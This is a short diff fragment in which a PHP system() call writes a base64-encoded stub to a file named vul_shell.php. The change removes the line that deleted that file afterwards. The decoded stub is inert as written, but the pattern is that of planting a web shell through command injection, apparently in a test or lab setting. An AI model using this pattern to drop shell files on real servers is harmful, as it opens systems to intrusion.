@@ -1,2 +1,2 @@
 <pre>system('echo PD9waHAgJF9QT1NUWyd0eXEnXTs/Pgo= | base64 -d > vul_shell.php')</pre>
-<pre>system('rm -rf vul_shell.php')</pre>
+
